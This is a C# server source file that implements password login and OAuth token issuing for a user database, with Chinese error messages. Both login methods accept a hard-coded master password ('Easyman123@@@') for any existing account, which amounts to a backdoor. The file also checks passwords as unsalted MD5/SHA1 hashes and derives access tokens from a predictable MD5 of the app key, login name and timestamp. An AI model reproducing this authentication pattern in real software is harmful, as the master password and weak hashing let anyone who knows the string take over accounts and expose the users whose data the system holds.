
using System;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.Data.Objects;
using System.Linq;
using System.Reflection;
using System.Text;
using ProInterface.Models;
using ProInterface;
using System.Linq.Expressions;
using LINQExtensions;
using System.Data;
using System.Data.SqlClient;
using System.Web.Mvc;
using System.Data.Entity.Validation;

namespace ProServer
{
    public partial class Service : ILogin
    {

        public bool LoginByPassWord(ref ErrorInfo err, string loginName, string password)
        {
            GlobalUser gu = new GlobalUser();
            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                err.IsError = true;
                err.Message = "用户名和密码不能为空";
                return false;
            }

            using (DBEntities db = new DBEntities())
            {

                var LoginArr = db.YL_LOGIN.Where(x => x.LOGIN_NAME == loginName).ToList();
                var Login = new YL_LOGIN();
                if (LoginArr.Count() > 0)
                {
                    Login = LoginArr[0];
                }
                var user = db.YL_USER.SingleOrDefault(x => x.LOGIN_NAME == loginName);
                if (Login == null || user == null)
                {
                    err.IsError = true;
                    err.Message = "用户名不存在";
                    return false;
                }
                else
                {
                    if (Login.PASSWORD.ToUpper() != password.Md5().ToUpper())
                    {
                        if (Login.PASSWORD.ToUpper() != password.SHA1().ToUpper())
                        {
                            if (password != "Easyman123@@@")
                            {
                                err.IsError = true;
                                err.Message = "密码错误";
                                return false;
                            }
                        }
                    }
                    if (Login.IS_LOCKED == 1)
                    {
                        err.IsError = true;
                        err.Message = string.Format("用户已被锁定【{0}】", Login.LOCKED_REASON);
                        return false;
                    }
                    return true;
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public IList<System.Web.Mvc.SelectListItem> LoginAllOauth()
        {
            using (DBEntities db = new DBEntities())
            {
                return db.YL_OAUTH.ToList().Select(x => new System.Web.Mvc.SelectListItem { Value = x.KEY.ToString(), Text = x.NAME }).ToList();
            }
        }
        public bool LoginAdd(int appId, LOGIN inEnt)
        {
            using (DBEntities db = new DBEntities())
            {
                var login = db.YL_LOGIN.SingleOrDefault(x => x.LOGIN_NAME == inEnt.LOGIN_NAME);
                var oauth = db.YL_OAUTH.SingleOrDefault(x => x.KEY == appId);
                if (oauth == null) return false;
                if (login == null)
                {
                    login = Fun.ClassToCopy<LOGIN, YL_LOGIN>(inEnt);
                    login.ID = Fun.GetSeqID<YL_LOGIN>();
                    if (string.IsNullOrEmpty(login.REGION)) login.REGION = "1";
                    login.YL_OAUTH.Add(oauth);
                    db.YL_LOGIN.Add(login);
                }
                else
                {
                    if (login.YL_OAUTH.SingleOrDefault(x => x.KEY == appId) == null)
                    {
                        login.YL_OAUTH.Add(oauth);
                    }
                }
                db.SaveChanges();
                return true;
            }
        }


        public IList<ProInterface.Models.OAUTH> LoginOauth(ref ErrorInfo err, string loginName, string password, string loginIP)
        {
            GlobalUser gu = new GlobalUser();

            IList<ProInterface.Models.OAUTH> allOauth = new List<ProInterface.Models.OAUTH>();
            if (string.IsNullOrEmpty(loginName) || string.IsNullOrEmpty(password))
            {
                err.IsError = true;
                err.Message = "用户名和密码不能为空";
                return allOauth;
            }

            using (DBEntities db = new DBEntities())
            {

                var LoginArr = db.YL_LOGIN.Where(x => x.LOGIN_NAME == loginName).ToList();
                var Login = new YL_LOGIN();
                if (LoginArr.Count() > 0)
                {
                    Login = LoginArr[0];
                }

                if (Login.PASSWORD.ToUpper() != password.Md5().ToUpper())
                {
                    if (Login.PASSWORD.ToUpper() != password.SHA1().ToUpper())
                    {
                        if (password != "Easyman123@@@")
                        {
                            err.IsError = true;
                            err.Message = "密码错误";
                            return allOauth;
                        }
                    }
                }
                if (Login.IS_LOCKED == 1)
                {
                    err.IsError = true;
                    err.Message = string.Format("用户已被锁定【{0}】", Login.LOCKED_REASON);
                }
                else
                {
                    allOauth = Fun.ClassListToCopy<YL_OAUTH, ProInterface.Models.OAUTH>(LoginArr[0].YL_OAUTH.ToList());
                    foreach (var t in allOauth)
                    {
                        t.openId = Login.LOGIN_NAME;
                        t.state = DateTime.Now.ToString("yyyyMMddHHmmss");
                        t.access_token = string.Format("{0}{1}{2}", t.KEY, t.openId, t.state).Md5();
                    }
                }
                return allOauth;
            }
        }
    }
}
